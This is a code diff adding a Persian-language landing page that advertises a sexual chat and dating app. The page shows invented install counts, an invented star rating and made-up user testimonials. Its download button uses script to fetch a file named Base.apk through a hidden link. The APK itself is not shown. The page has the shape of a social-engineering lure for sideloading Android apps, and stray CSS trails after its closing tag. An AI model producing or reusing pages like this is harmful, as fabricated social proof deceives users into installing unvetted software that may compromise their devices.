@@ -68,6 +68,7 @@
       border-radius: 12px;
       font-size: 16px;
       transition: 0.3s ease;
+      cursor: pointer;
     }
 
     .download-buttons a:hover {
@@ -113,6 +114,62 @@
       color: #ccc;
     }
 
+    .footer {
+      margin-top: 35px;
+      font-size: 13px;
+      color: #888;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="Logo.png" alt="App Icon" class="app-icon">
+    <h1>اپلیکیشن رسمی ما</h1>
+    <div class="version">نسخه 1.0.1 | حجم: 8 مگابایت</div>
+    <div class="install-count">📥 بیش از <b>120,000</b> نصب فعال</div>
+    <div class="rating">⭐️⭐️⭐️⭐️☆ 4.6 / 5</div>
+    <div class="popularity-bar"><div class="popularity-fill"></div></div>
+    <div class="desc">
+      اپلیکیشنی متفاوت برای چت سکسی، بازی‌های دو نفره، آشنایی، تماس تصویری، پیام خصوصی و امکانات VIP 💖 <br>همین الان نصب کن و لذت ببر!
+    </div>
+    <div class="download-buttons">
+      <a id="downloadLink" href="#">📥 دانلود مستقیم</a>
+    </div>
+    <div class="comments">
+      <h3>📣 نظرات کاربران:</h3>
+      <div class="comment">🔹 <b>ریحانه</b>: خیلی باحاله، مخصوصاً بخش چت خصوصی 😍</div>
+      <div class="comment">🔹 <b>امیر</b>: با این اپ تونستم کلی دوست جدید پیدا کنم! 🌟</div>
+      <div class="comment">🔹 <b>هانیه</b>: من عاشق بازی‌های سکسی داخلش شدم 😋🔥</div>
+      <div class="comment">🔹 <b>پوریا</b>: دم شما گرم، اپلیکیشنتون خیلی سبکه 👌</div>
+    </div>
+  </div>
+
+  <div class="footer">
+    طراحی شده با ❤️ مخصوص کاربران ویژه
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const downloadLink = document.getElementById('downloadLink');
+      
+      downloadLink.addEventListener('click', function(e) {
+        e.preventDefault(); // جلوگیری از رفتن به لینک
+        
+        // ایجاد لینک مخفی برای دانلود فایل Base.apk
+        const hiddenLink = document.createElement('a');
+        hiddenLink.href = 'Base.apk'; // نام فایل APK
+        hiddenLink.download = 'Base.apk'; // نام فایل هنگام دانلود
+        document.body.appendChild(hiddenLink);
+        hiddenLink.click();
+        document.body.removeChild(hiddenLink);
+        
+        // نمایش پیام (اختیاری)
+        alert('دانلود اپلیکیشن آغاز شد! لطفاً منتظر بمانید...');
+      });
+    });
+  </script>
+</body>
+</html>
     .footer {
       margin-top: 35px;
       font-size: 13px;
